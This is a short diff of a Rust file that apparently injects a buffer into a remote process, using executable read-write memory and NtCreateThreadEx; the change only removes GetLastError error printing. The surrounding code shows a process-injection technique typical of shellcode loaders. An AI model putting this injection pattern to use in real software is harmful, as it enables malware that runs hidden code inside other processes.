@@ -9,7 +9,6 @@ use ntapi::{
 };
 use winapi::{
     um::{
-        errhandlingapi::GetLastError,
         winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, MEM_RESERVE, MAXIMUM_ALLOWED},
         lmaccess::{ACCESS_ALL}
     },
@@ -97,8 +96,6 @@ fn enhance(mut buf: Vec<u8>, tar:usize) {
         */
         let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, null_mut(), handle, allocstart, null_mut(), 0, 0, 0, 0, null_mut());
         if !NT_SUCCESS(write_thread) {
-            let last_error = GetLastError();
-            println!("{}", last_error);
             panic!("Error failed to create remote thread: {}", write_thread);
         }
 
